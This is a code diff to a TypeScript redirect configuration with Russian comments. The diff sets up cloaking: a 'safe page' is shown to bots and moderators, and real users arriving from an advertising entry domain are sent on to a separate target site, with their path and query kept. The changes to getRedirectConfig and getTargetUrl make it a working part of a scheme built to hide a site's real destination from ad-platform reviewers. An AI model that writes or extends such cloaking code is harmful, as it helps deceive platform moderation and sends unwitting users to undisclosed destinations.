@@ -3,6 +3,7 @@
 export interface RedirectConfig {
   mainDomain: string;
   botRedirectUrl: string;
+  realUserRedirectUrl: string;
   fallbackUrl: string;
   allowedPaths: string[];
   excludedPaths: string[];
@@ -11,14 +12,17 @@ export interface RedirectConfig {
 // Получение конфигурации редиректов
 export function getRedirectConfig(): RedirectConfig {
   return {
-    // Основной домен проекта (обновите на ваш домен)
-    mainDomain: "updatescheck.netlify.app",
+    // Рекламная страница (входная точка)
+    mainDomain: "penalibabasi.netlify.app",
     
-    // URL для редиректа ботов (обновите на безопасную страницу)
-    botRedirectUrl: "https://www.google.com",
+    // URL для редиректа ботов/модераторов (безопасная страница)
+    botRedirectUrl: "https://yalanyokgaming.netlify.app",
+    
+    // URL для редиректа реальных пользователей (целевая страница)
+    realUserRedirectUrl: "https://aslanerturk.com",
     
     // Fallback URL для неопределенных случаев
-    fallbackUrl: "https://updatescheck.netlify.app",
+    fallbackUrl: "https://aslanerturk.com",
     
     // Разрешенные пути (не требуют проверки)
     allowedPaths: [
@@ -57,18 +61,22 @@ export function isAllowedPath(pathname: string, config: RedirectConfig): boolean
          );
 }
 
-// Получение целевого URL для редиректа
+// Получение целевого URL для редиректа реальных пользователей
 export function getTargetUrl(request: Request, config: RedirectConfig): string {
   const url = new URL(request.url);
-  const host = request.headers.get("host") || "";
   
-  // Если уже на основном домене - возвращаем текущий URL
-  if (host.includes(config.mainDomain)) {
-    return url.toString();
+  // Всегда редиректим реальных пользователей на целевую страницу
+  // Сохраняем путь и параметры запроса, если они есть
+  const pathAndQuery = url.pathname + url.search;
+  
+  // Если путь не пустой и не корневой, добавляем его к целевому URL
+  if (pathAndQuery && pathAndQuery !== '/') {
+    return `${config.realUserRedirectUrl}${pathAndQuery}`;
   }
   
-  // Иначе редиректим на основной домен
-  return `https://${config.mainDomain}${url.pathname}${url.search}`;
+  // Иначе просто редиректим на целевую страницу
+  return config.realUserRedirectUrl;
 }
+
 
 
